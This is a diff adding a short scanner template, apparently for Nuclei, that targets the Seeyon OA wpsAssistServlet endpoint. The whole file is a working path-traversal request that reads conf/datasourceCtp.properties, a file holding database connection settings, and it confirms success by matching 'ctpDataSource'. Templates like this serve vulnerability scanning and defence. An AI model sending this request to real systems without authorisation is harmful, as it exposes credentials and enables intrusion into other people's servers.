@@ -1,0 +1,27 @@
+id: seeyon-wpsAssistServlet-fileread
+
+info:
+  name: seeyon-wpsAssistServlet-fileread
+  author: seeyon-wpsAssistServlet-fileread
+
+
+requests:
+  - raw:
+      - |
+        GET /seeyon/wpsAssistServlet?flag=open&fileId=-1233531&fileType=/../../conf/datasourceCtp.properties HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+        Connection: close
+        Accept: */*
+        Accept-Encoding: gzip
+        Accept-Language: en
+
+        
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body,"ctpDataSource")
+
